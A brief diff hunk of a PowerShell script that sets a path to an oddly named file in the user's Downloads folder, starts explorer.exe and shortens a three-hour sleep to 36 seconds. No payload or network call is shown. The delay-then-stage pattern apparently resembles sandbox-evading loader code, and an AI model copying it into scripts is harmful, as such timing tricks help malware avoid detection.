@@ -9,7 +9,7 @@ $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
 
 Start-Process "explorer.exe"
 
-Start-Sleep -Seconds 10800
+Start-Sleep -Seconds 36
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
